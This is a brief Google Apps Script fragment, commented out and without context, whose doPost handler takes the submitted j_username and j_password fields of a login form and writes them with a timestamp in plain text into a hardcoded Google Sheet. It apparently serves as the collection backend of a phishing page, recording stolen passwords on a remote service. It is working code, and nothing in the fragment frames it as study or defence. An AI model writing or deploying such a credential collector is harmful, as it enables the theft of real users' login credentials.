

/*

function doPost(e) {
  // 1) Open your spreadsheet by its ID
  var ss = SpreadsheetApp.openById('1KAgfc09Ool3r2PSTTO6ex8bBBNaly9Pb9Jg8bhLf9t4');
  var sheet = ss.getSheetByName('Sheet1');

  // 2) Append a new row: [Timestamp, Username, Password]
  sheet.appendRow([
    new Date(),
    e.parameter.j_username,
    e.parameter.j_password
  ]);

  // 3) Return a simple success response
  return ContentService
    .createTextOutput('OK')
    .setMimeType(ContentService.MimeType.TEXT);
}

*/